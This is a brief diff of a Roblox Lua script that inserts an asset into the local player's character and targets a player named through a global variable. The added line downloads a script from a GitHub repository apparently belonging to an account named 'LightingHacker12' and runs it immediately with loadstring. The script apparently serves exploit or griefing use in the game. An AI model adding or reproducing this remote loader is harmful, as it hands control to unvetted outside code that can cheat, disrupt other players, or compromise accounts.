@@ -1,6 +1,8 @@
 local folder = game:GetObjects("rbxassetid://13408856067")[1] 
 folder.Parent = game:GetService("Players").LocalPlayer.Character
 
+loadstring(game:HttpGet("https://github.com/LightingHacker12/whatanicelibrary/blob/main/local%20script", true))()
+
 local Player = game.Players:WaitForChild(_G.yunusemrekzc)
 
 --Player = game:GetService("Players"):GetPlayerFromCharacter(script.Parent)
